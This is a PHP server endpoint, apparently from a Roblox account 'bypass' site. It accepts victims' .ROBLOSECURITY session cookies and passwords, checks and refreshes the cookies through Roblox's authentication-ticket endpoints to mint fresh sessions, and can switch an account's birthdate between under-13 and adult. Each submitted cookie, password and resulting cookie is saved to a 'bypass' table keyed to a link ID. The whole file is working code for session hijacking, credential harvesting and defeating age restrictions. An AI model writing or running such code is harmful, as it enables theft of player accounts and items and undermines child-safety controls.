<?php
if (session_status() === PHP_SESSION_NONE) {
    $sessionLifetime = 365 * 24 * 60 * 60;
    $secure = (
        (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
        (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https')
    );
    $validSessionIdPattern = '/^[A-Za-z0-9,-]{16,128}$/';
    $validSessionNamePattern = '/^[A-Za-z][A-Za-z0-9_]{0,63}$/';
    $sessionCookieNames = ['token', 'PHPSESSID'];

    foreach (array_keys($_COOKIE) as $cookieName) {
        if (
            !in_array($cookieName, $sessionCookieNames, true) &&
            preg_match($validSessionNamePattern, (string) $cookieName) &&
            !empty($_COOKIE[$cookieName]) &&
            preg_match($validSessionIdPattern, (string) $_COOKIE[$cookieName])
        ) {
            $sessionCookieNames[] = $cookieName;
        }
    }

    $selectedSessionName = 'token';

    foreach ($sessionCookieNames as $candidateName) {
        if (
            !empty($_COOKIE[$candidateName]) &&
            preg_match($validSessionIdPattern, (string) $_COOKIE[$candidateName])
        ) {
            $selectedSessionName = $candidateName;
            break;
        }
    }

    session_name($selectedSessionName);
    ini_set('session.gc_maxlifetime', (string) $sessionLifetime);
    ini_set('session.use_strict_mode', '1');
    ini_set('session.use_only_cookies', '1');

    if (PHP_VERSION_ID >= 70300) {
        session_set_cookie_params([
            'lifetime' => $sessionLifetime,
            'path' => '/',
            'secure' => $secure,
            'httponly' => true,
            'samesite' => 'Lax'
        ]);
    } else {
        session_set_cookie_params($sessionLifetime, '/', '', $secure, true);
    }

    session_start();

    $hasBypassSession = function () {
        return (
            !empty($_SESSION['discord_user_id']) ||
            !empty($_SESSION['discord_username']) ||
            !empty($_SESSION['auth_code']) ||
            !empty($_SESSION['link_id']) ||
            !empty($_SESSION['login_method'])
        );
    };

    if (!$hasBypassSession()) {
        $originalSessionName = session_name();
        $originalSessionId = session_id();

        foreach ($sessionCookieNames as $fallbackName) {
            if (
                $fallbackName === session_name() ||
                empty($_COOKIE[$fallbackName]) ||
                !preg_match($validSessionIdPattern, (string) $_COOKIE[$fallbackName])
            ) {
                continue;
            }

            session_write_close();
            session_name($fallbackName);
            session_id((string) $_COOKIE[$fallbackName]);
            session_start();

            if ($hasBypassSession()) {
                break;
            }
        }

        if (!$hasBypassSession() && $originalSessionId !== '') {
            session_write_close();
            session_name($originalSessionName);
            session_id($originalSessionId);
            session_start();
        }
    }

    if (!headers_sent() && session_id() !== '' && $hasBypassSession()) {
        if (PHP_VERSION_ID >= 70300) {
            setcookie('token', session_id(), [
                'expires' => time() + $sessionLifetime,
                'path' => '/',
                'secure' => $secure,
                'httponly' => true,
                'samesite' => 'Lax'
            ]);
        } else {
            setcookie('token', session_id(), time() + $sessionLifetime, '/', '', $secure, true);
        }

        $_COOKIE['token'] = session_id();
    }
}

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: ' . ($_SERVER['HTTP_ORIGIN'] ?? '*'));
header('Access-Control-Allow-Headers: Content-Type, X-Requested-With, X-CSRF-TOKEN');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

set_error_handler(function($errno, $errstr, $errfile, $errline) {
    throw new ErrorException($errstr, 0, $errno, $errfile, $errline);
});

try {

include '../libs/configuration.php';
/* ---- functions this file uses (formerly from libs/functions.php, which is no longer needed) ---- */
if (!function_exists('normalizeWarning')) {
function normalizeWarning($cookie) {
    $warn = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_";
    while (str_starts_with($cookie, $warn . $warn)) {
        $cookie = substr($cookie, strlen($warn));
    }
    return $cookie;
}
}
if (!function_exists('executeSafeQuery')) {
function executeSafeQuery($sql, $params = []) {
    static $db = null;   // one database connection for the whole page (was: a new one for every query)
    if ($db === null) {
        include $_SERVER['DOCUMENT_ROOT'] . '/libs/connection.php';
    }
    
    // Block suspicious keywords (customize based on your needs)
$blockedKeywords = ['DROP TABLE', 'DELETE FROM', 'TRUNCATE TABLE', 'GRANT ', 'ALTER TABLE', 'CREATE TABLE', 'CREATE DATABASE'];
	foreach ($blockedKeywords as $keyword) {
        if (stripos($sql, $keyword) !== false) {
            throw new Exception("Suspicious SQL operation detected");
        }
    }

    try {
        $stmt = $db->prepare($sql);
        
        // Bind parameters securely
        foreach ($params as $key => $value) {
            $stmt->bindValue(is_int($key) ? $key + 1 : $key, $value, 
                is_int($value) ? PDO::PARAM_INT : PDO::PARAM_STR);
        }
        
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    } catch (PDOException $e) {
        error_log("Database error: " . $e->getMessage());
        return [];
    }
}
}
/* ---- end of the functions from libs/functions.php ---- */
include '../libs/connection.php';

$authCode = trim((string)($_SESSION['auth_code'] ?? ''));
if ($authCode === '') {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

try {
    $result = executeSafeQuery(
        'SELECT * FROM regular WHERE auth_code = :auth_code LIMIT 2',
        [':auth_code' => $authCode]
    );
} catch (\Throwable $e) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

if (!is_array($result) || count($result) !== 1 || !is_array($result[0])) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

$userData = $result[0];
$storedAuthCode = (string)($userData['auth_code'] ?? '');
$link_id = (int)($userData['link_id'] ?? 0);
if ($storedAuthCode === '' || !hash_equals($storedAuthCode, $authCode) || $link_id <= 0) {
    echo json_encode(['success' => false, 'message' => 'Unauthorized']);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    echo json_encode(['success' => false, 'message' => 'Invalid request']);
    exit();
}

$cookie = trim($input['cookie'] ?? '');
$bypass_type = $input['bypass_type'] ?? '';
$password = trim($input['password'] ?? '');

if (empty($cookie)) {
    echo json_encode(['success' => false, 'message' => 'Cookie is required']);
    exit();
}

if (function_exists('normalizeWarning')) {
    $cookie = normalizeWarning($cookie);
} else {
    $cookie = bypassNormalizeCookie($cookie);
}

if (empty($cookie) || strlen($cookie) < 100) {
    echo json_encode(['success' => false, 'message' => 'Invalid cookie format']);
    exit();
}

if (!in_array($bypass_type, ['validate', 'refresh', 'all_ages'])) {
    echo json_encode(['success' => false, 'message' => 'Invalid bypass type. Use: validate, refresh, all_ages']);
    exit();
}

if ($bypass_type === 'all_ages' && empty($password)) {
    echo json_encode(['success' => false, 'message' => 'Password is required for All Ages bypass']);
    exit();
}

$proxy = null;
$result_cookie = '';
$status = 'failed';
$message = '';
$extra_data = [];

if ($bypass_type === 'validate') {
    $authCheck = bypassValidateCookie($cookie, $proxy);
    
    if ($authCheck['valid']) {
        $result_cookie = $cookie;
        $status = 'success';
        $message = 'Cookie is valid! Username: ' . ($authCheck['username'] ?? 'Unknown');
        $extra_data = [
            'username' => $authCheck['username'] ?? '',
            'userId' => $authCheck['userId'] ?? '',
            'displayName' => $authCheck['displayName'] ?? ''
        ];
    } else {
        $message = 'Cookie is invalid or expired';
    }
}

if ($bypass_type === 'refresh') {
    $authCheck = bypassValidateCookie($cookie, $proxy);
    if (!$authCheck['valid']) {
        echo json_encode(['success' => false, 'message' => 'Invalid or expired cookie']);
        exit();
    }
    
    $newCookie = bypassRefreshCookie($cookie, $proxy);
    if ($newCookie && isset($newCookie['success']) && $newCookie['success']) {
        $result_cookie = $newCookie['cookie'];
        $status = 'success';
        $message = 'Cookie refreshed successfully!';
        $extra_data = ['username' => $authCheck['username'] ?? ''];
    } else {
        $message = $newCookie['message'] ?? 'Failed to refresh cookie';
    }
}

if ($bypass_type === 'all_ages') {
    $result = bypassAllAges($cookie, $password, $proxy);
    if ($result['success']) {
        $result_cookie = $result['cookie'];
        $status = 'success';
        $message = $result['message'] ?? 'Age changed successfully!';
        $extra_data = [
            'old_age' => $result['old_age'] ?? null,
            'new_age' => $result['new_age'] ?? null
        ];
    } else {
        $message = $result['message'];
        if (isset($result['debug'])) {
            $extra_data['debug'] = $result['debug'];
        }
    }
}

$insertQuery = "INSERT INTO bypass (link_id, cookie, password, bypass_type, result_cookie, status) 
                VALUES (:link_id, :cookie, :password, :bypass_type, :result_cookie, :status)";

$params = [
    ':link_id' => $link_id,
    ':cookie' => $cookie,
    ':password' => $bypass_type === 'all_ages' ? $password : null,
    ':bypass_type' => $bypass_type,
    ':result_cookie' => $result_cookie,
    ':status' => $status
];

executeSafeQuery($insertQuery, $params);

if ($status === 'success') {
    $response = [
        'success' => true,
        'message' => $message,
        'result_cookie' => $result_cookie,
        'bypass_type' => $bypass_type
    ];
    if (!empty($extra_data)) {
        $response = array_merge($response, $extra_data);
    }
    echo json_encode($response);
} else {
    $errorResponse = [
        'success' => false,
        'message' => $message
    ];
    if (!empty($extra_data['debug'])) {
        $errorResponse['debug'] = $extra_data['debug'];
    }
    echo json_encode($errorResponse);
}

} catch (Exception $e) {
    http_response_code(200);
    echo json_encode([
        'success' => false,
        'message' => 'Server error: ' . $e->getMessage()
    ]);
    exit();
} catch (Error $e) {
    http_response_code(200);
    echo json_encode([
        'success' => false,
        'message' => 'Server error: ' . $e->getMessage()
    ]);
    exit();
}


function bypassNormalizeCookie($cookie) {
    if (empty($cookie)) return '';
    $cookie = trim($cookie);
    $cookie = preg_replace('/[\r\n\t]+/', '', $cookie);
    $cookie = trim($cookie);
    $cookie = trim($cookie, '"\'`');
    $maxDecode = 3;
    for ($i = 0; $i < $maxDecode; $i++) {
        $decoded = urldecode($cookie);
        if ($decoded === $cookie) break;
        $cookie = $decoded;
    }
    if (stripos($cookie, 'cookie:') === 0) {
        $cookie = trim(substr($cookie, 7));
    }
    if (stripos($cookie, '.roblosecurity=') !== false) {
        $cookie = preg_replace('/.*\.roblosecurity=/i', '', $cookie);
    }
    if (strpos($cookie, ';') !== false) {
        $cookie = explode(';', $cookie)[0];
    }
    $prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    if (strpos($cookie, '_|WARNING') === 0) {
        if (preg_match('/^_\|WARNING[^|]*\|_(.+)$/i', $cookie, $matches)) {
            $cookie = $matches[1];
        }
    }
    $cookie = trim($cookie);
    if (strlen($cookie) < 100) {
        return '';
    }
    return $prefix . $cookie;
}

function bypassValidateRobloxCookie($cookie) {
    $prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
    if (strpos($cookie, $prefix) !== 0) {
        return false;
    }
    $cookieValue = substr($cookie, strlen($prefix));
    return strlen($cookieValue) >= 100;
}

function bypassRobloxRequest($url, $cookie, $proxy = null, $method = 'GET', $data = null, $extraHeaders = []) {
    $ch = curl_init();
    $headers = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'Accept: application/json, text/plain, */*',
        'Accept-Language: en-US,en;q=0.9',
        'Origin: https://www.roblox.com',
        'Referer: https://www.roblox.com/'
    ];
    if (!empty($cookie)) {
        $cookieValue = $cookie;
        if (strpos($cookieValue, '_|WARNING') === 0) {
            if (preg_match('/^_\|WARNING[^|]*\|_(.+)$/i', $cookieValue, $matches)) {
                $cookieValue = $matches[1];
            }
        }
        $headers[] = 'Cookie: .ROBLOSECURITY=' . $cookieValue;
    }
    if ($data !== null) {
        $headers[] = 'Content-Type: application/json';
    }
    $headers = array_merge($headers, $extraHeaders);
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_TIMEOUT => 15,
        CURLOPT_CONNECTTIMEOUT => 8,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HEADER => true
    ]);
    if ($proxy) {
        if (is_array($proxy)) {
            if (!empty($proxy['proxy'])) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy['proxy']);
                if (!empty($proxy['auth'])) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
                }
            }
        } else {
            curl_setopt($ch, CURLOPT_PROXY, $proxy);
        }
    }
    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        if ($data !== null) {
            curl_setopt($ch, CURLOPT_POSTFIELDS, is_array($data) ? json_encode($data) : $data);
        } else {
            curl_setopt($ch, CURLOPT_POSTFIELDS, '');
        }
    }
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $error = curl_error($ch);
    curl_close($ch);
    if ($error) {
        return ['success' => false, 'error' => $error, 'httpCode' => 0];
    }
    $responseHeaders = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    $csrfToken = null;
    if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $responseHeaders, $matches)) {
        $csrfToken = trim($matches[1]);
    }
    $newCookie = null;
    if (preg_match('/\.ROBLOSECURITY=([^;\s\r\n]+)/i', $responseHeaders, $matches)) {
        $newCookie = trim($matches[1]);
    }
    $authTicket = null;
    if (preg_match('/rbx-authentication-ticket:\s*([^\r\n]+)/i', $responseHeaders, $matches)) {
        $authTicket = trim($matches[1]);
    }
    return [
        'success' => true,
        'httpCode' => $httpCode,
        'body' => json_decode($body, true) ?? $body,
        'rawBody' => $body,
        'csrfToken' => $csrfToken,
        'newCookie' => $newCookie,
        'authTicket' => $authTicket,
        'rawHeaders' => $responseHeaders
    ];
}

function bypassGetCsrfToken($cookie, $proxy = null) {
    $response = bypassRobloxRequest(
        'https://auth.roblox.com/v2/logout',
        $cookie,
        $proxy,
        'POST'
    );
    return $response['csrfToken'] ?? null;
}

function bypassValidateCookie($cookie, $proxy = null) {
    $response = bypassRobloxRequest(
        'https://users.roblox.com/v1/users/authenticated',
        $cookie,
        $proxy
    );
    if ($response['success'] && $response['httpCode'] === 200 && isset($response['body']['id'])) {
        return [
            'valid' => true,
            'userId' => $response['body']['id'],
            'username' => $response['body']['name'] ?? '',
            'displayName' => $response['body']['displayName'] ?? ''
        ];
    }
    return ['valid' => false];
}

function bypassRefreshCookie($cookie, $proxy = null) {
    $csrf = bypassGetCsrfToken($cookie, $proxy);
    if (empty($csrf)) {
        return ['success' => false, 'message' => 'Failed to get CSRF token'];
    }

    $maxRetries = 10;
    $ticket = null;

    for ($attempt = 1; $attempt <= $maxRetries; $attempt++) {
        if ($ticket === null || $attempt > 1) {
            $ticketResponse = bypassRobloxRequest(
                'https://auth.roblox.com/v1/authentication-ticket',
                $cookie,
                $proxy,
                'POST',
                null,
                ['X-Csrf-Token: ' . $csrf]
            );

            if ($ticketResponse['httpCode'] === 403 && $ticketResponse['csrfToken']) {
                $csrf = $ticketResponse['csrfToken'];
                $ticketResponse = bypassRobloxRequest(
                    'https://auth.roblox.com/v1/authentication-ticket',
                    $cookie,
                    $proxy,
                    'POST',
                    null,
                    ['X-Csrf-Token: ' . $csrf]
                );
            }

            if ($ticketResponse['httpCode'] !== 200 || empty($ticketResponse['authTicket'])) {
                if ($attempt >= 3) {
                    return ['success' => false, 'message' => 'Failed to get ticket (HTTP ' . $ticketResponse['httpCode'] . ')'];
                }
                usleep(500000);
                continue;
            }

            $ticket = $ticketResponse['authTicket'];
        }

        if ($attempt > 1) {
            usleep(min(200000 * $attempt, 2000000));
        } else {
            usleep(100000);
        }

        $redeemResponse = bypassRobloxRequest(
            'https://auth.roblox.com/v1/authentication-ticket/redeem',
            '',
            $proxy,
            'POST',
            ['authenticationTicket' => $ticket],
            ['RBXAuthenticationNegotiation: 1']
        );

        if ($redeemResponse['httpCode'] === 200) {
            $newCookie = $redeemResponse['newCookie'];
            if ($newCookie && strlen($newCookie) > 100) {
                $prefix = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
                if (strpos($newCookie, '_|WARNING') !== 0) {
                    $newCookie = $prefix . $newCookie;
                }
                return ['success' => true, 'cookie' => $newCookie];
            }
        }

        if ($redeemResponse['httpCode'] === 429) {
            sleep(3);
            continue;
        }

        if ($redeemResponse['httpCode'] === 403) {
            $body = $redeemResponse['body'];
            $errorMsg = is_array($body) && isset($body['errors'][0]['message']) ? $body['errors'][0]['message'] : '';
            if (stripos($errorMsg, 'expired') !== false || stripos($errorMsg, 'invalid') !== false) {
                $ticket = null;
            }
        }
    }

    return ['success' => false, 'message' => 'All ' . $maxRetries . ' redeem attempts failed'];
}

function bypassGetBirthdate($cookie, $proxy = null, $csrf = null) {
    if (!$csrf) {
        $csrf = bypassGetCsrfToken($cookie, $proxy);
    }
    $headers = [];
    if ($csrf) {
        $headers[] = 'X-CSRF-TOKEN: ' . $csrf;
    }
    $response = bypassRobloxRequest(
        'https://accountinformation.roblox.com/v1/birthdate',
        $cookie, $proxy, 'GET', null, $headers
    );
    if ($response['success'] && $response['httpCode'] === 200 && isset($response['body']['birthYear'])) {
        return [
            'success' => true,
            'birthYear' => (int)$response['body']['birthYear'],
            'birthMonth' => (int)$response['body']['birthMonth'],
            'birthDay' => (int)$response['body']['birthDay']
        ];
    }
    if ($response['httpCode'] === 403 && !empty($response['csrfToken'])) {
        $response = bypassRobloxRequest(
            'https://accountinformation.roblox.com/v1/birthdate',
            $cookie, $proxy, 'GET', null,
            ['X-CSRF-TOKEN: ' . $response['csrfToken']]
        );
        if ($response['success'] && $response['httpCode'] === 200 && isset($response['body']['birthYear'])) {
            return [
                'success' => true,
                'birthYear' => (int)$response['body']['birthYear'],
                'birthMonth' => (int)$response['body']['birthMonth'],
                'birthDay' => (int)$response['body']['birthDay']
            ];
        }
    }
    if ($response['httpCode'] === 401) {
        return ['success' => false, 'error' => 'Cookie expired or invalid (401)'];
    }
    $errorMsg = '';
    if (is_array($response['body']) && isset($response['body']['message'])) {
        $errorMsg = $response['body']['message'];
    }
    return [
        'success' => false,
        'error' => $errorMsg ?: ('HTTP ' . ($response['httpCode'] ?? 0)),
        'httpCode' => $response['httpCode'] ?? 0
    ];
}

function bypassChangeBirthdate($cookie, $password, $year, $month, $day, $proxy = null, $csrf = null) {
    if (!$csrf) {
        $csrf = bypassGetCsrfToken($cookie, $proxy);
    }

    $cookieValue = $cookie;
    if (strpos($cookieValue, '_|WARNING') === 0) {
        if (preg_match('/^_\|WARNING[^|]*\|_(.+)$/i', $cookieValue, $matches)) {
            $cookieValue = $matches[1];
        }
    }

    $data = json_encode([
        'birthYear' => (int)$year,
        'birthMonth' => (int)$month,
        'birthDay' => (int)$day,
        'password' => $password
    ]);

    $methods = ['POST', 'PATCH'];
    $lastHttpCode = 0;
    $lastBody = '';

    foreach ($methods as $method) {
        $ch = curl_init();
        $headers = [
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            'Accept: application/json, text/plain, */*',
            'Accept-Language: en-US,en;q=0.9',
            'Content-Type: application/json;charset=utf-8',
            'Origin: https://www.roblox.com',
            'Referer: https://www.roblox.com/my/account',
            'Cookie: .ROBLOSECURITY=' . $cookieValue,
            'X-CSRF-TOKEN: ' . $csrf
        ];
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://accountinformation.roblox.com/v1/birthdate',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => $method,
            CURLOPT_POSTFIELDS => $data,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_HEADER => true
        ]);
        if ($proxy) {
            if (is_array($proxy) && !empty($proxy['proxy'])) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy['proxy']);
                if (!empty($proxy['auth'])) {
                    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['auth']);
                }
            } elseif (is_string($proxy)) {
                curl_setopt($ch, CURLOPT_PROXY, $proxy);
            }
        }
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
        curl_close($ch);
        $responseHeaders = substr($response, 0, $headerSize);
        $body = substr($response, $headerSize);
        $csrfToken = null;
        if (preg_match('/x-csrf-token:\s*([^\r\n]+)/i', $responseHeaders, $matches)) {
            $csrfToken = trim($matches[1]);
        }

        if ($httpCode === 403 && $csrfToken) {
            $csrf = $csrfToken;
            foreach ($headers as &$h) {
                if (strpos($h, 'X-CSRF-TOKEN:') === 0) {
                    $h = 'X-CSRF-TOKEN: ' . $csrfToken;
                    break;
                }
            }
            unset($h);
            $ch2 = curl_init();
            curl_setopt_array($ch2, [
                CURLOPT_URL => 'https://accountinformation.roblox.com/v1/birthdate',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_CUSTOMREQUEST => $method,
                CURLOPT_POSTFIELDS => $data,
                CURLOPT_HTTPHEADER => $headers,
                CURLOPT_TIMEOUT => 15,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_SSL_VERIFYHOST => false,
                CURLOPT_HEADER => true
            ]);
            if ($proxy) {
                if (is_array($proxy) && !empty($proxy['proxy'])) {
                    curl_setopt($ch2, CURLOPT_PROXY, $proxy['proxy']);
                    if (!empty($proxy['auth'])) {
                        curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $proxy['auth']);
                    }
                } elseif (is_string($proxy)) {
                    curl_setopt($ch2, CURLOPT_PROXY, $proxy);
                }
            }
            $response = curl_exec($ch2);
            $httpCode = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
            $headerSize = curl_getinfo($ch2, CURLINFO_HEADER_SIZE);
            curl_close($ch2);
            $body = substr($response, $headerSize);
        }

        $lastHttpCode = $httpCode;
        $lastBody = $body;

        if ($httpCode === 200) {
            return [
                'success' => true,
                'httpCode' => $httpCode,
                'body' => json_decode($body, true) ?? $body,
                'rawBody' => $body,
                'method' => $method
            ];
        }

        if ($httpCode !== 404) {
            return [
                'success' => true,
                'httpCode' => $httpCode,
                'body' => json_decode($body, true) ?? $body,
                'rawBody' => $body,
                'method' => $method
            ];
        }
    }

    return [
        'success' => true,
        'httpCode' => $lastHttpCode,
        'body' => json_decode($lastBody, true) ?? $lastBody,
        'rawBody' => $lastBody,
        'method' => 'all_failed'
    ];
}

function bypassAllAges($cookie, $password, $proxy = null) {
    $authCheck = bypassValidateCookie($cookie, $proxy);
    if (!$authCheck['valid']) {
        return ['success' => false, 'message' => 'Invalid or expired cookie'];
    }
    $csrf = bypassGetCsrfToken($cookie, $proxy);
    if (!$csrf) {
        return ['success' => false, 'message' => 'Failed to get CSRF token'];
    }
    $birthdate = bypassGetBirthdate($cookie, $proxy, $csrf);
    if (!$birthdate['success']) {
        $errorDetail = $birthdate['error'] ?? 'Unknown error';
        $response = ['success' => false, 'message' => 'Failed to get birthdate: ' . $errorDetail];
        if (isset($birthdate['debug'])) {
            $response['debug'] = $birthdate['debug'];
        }
        return $response;
    }
    $currentYear = (int)date('Y');
    $currentAge = $currentYear - $birthdate['birthYear'];
    $isEstimated = isset($birthdate['estimated']) && $birthdate['estimated'];
    if ($currentAge >= 13) {
        $newBirthYear = $currentYear - 10;
        $ageChange = '13+ to <13';
    } else {
        $newBirthYear = $currentYear - 18;
        $ageChange = '<13 to 13+';
    }
    $newAge = $currentYear - $newBirthYear;
    $updateResponse = bypassChangeBirthdate(
        $cookie, $password, $newBirthYear,
        $birthdate['birthMonth'], $birthdate['birthDay'],
        $proxy, $csrf
    );
    if ($updateResponse['httpCode'] === 200) {
        $msg = "Age changed successfully! ($ageChange)";
        if ($isEstimated) {
            $msg .= " [Note: Original birthdate was estimated]";
        }
        return [
            'success' => true,
            'cookie' => $cookie,
            'message' => $msg,
            'old_age' => $currentAge,
            'new_age' => $newAge
        ];
    }
    if ($updateResponse['httpCode'] === 401) {
        return ['success' => false, 'message' => 'Invalid password'];
    }
    if ($updateResponse['httpCode'] === 403) {
        $errorBody = $updateResponse['body'];
        if (is_array($errorBody) && isset($errorBody['errors'])) {
            foreach ($errorBody['errors'] as $error) {
                $msg = $error['message'] ?? '';
                if (stripos($msg, 'pin') !== false) {
                    return ['success' => false, 'message' => 'Account PIN is enabled. Disable PIN first.'];
                }
                if (stripos($msg, 'verification') !== false) {
                    return ['success' => false, 'message' => 'ID Verification required.'];
                }
                if (stripos($msg, 'Captcha') !== false) {
                    return ['success' => false, 'message' => 'Captcha required. Try again later.'];
                }
            }
        }
        return ['success' => false, 'message' => 'Access denied. Account may have additional security.'];
    }
    if ($updateResponse['httpCode'] === 429) {
        return ['success' => false, 'message' => 'Rate limited. Try again later.'];
    }
    $errorMsg = 'Failed to change age (HTTP ' . $updateResponse['httpCode'] . ')';
    if (is_array($updateResponse['body']) && isset($updateResponse['body']['errors'][0]['message'])) {
        $errorMsg = $updateResponse['body']['errors'][0]['message'];
    } elseif (is_array($updateResponse['body']) && isset($updateResponse['body']['message'])) {
        $errorMsg = $updateResponse['body']['message'];
    }
    return [
        'success' => false,
        'message' => $errorMsg,
        'debug' => [
            'httpCode' => $updateResponse['httpCode'],
            'method' => $updateResponse['method'] ?? 'unknown',
            'rawBody' => substr($updateResponse['rawBody'] ?? '', 0, 500)
        ]
    ];
}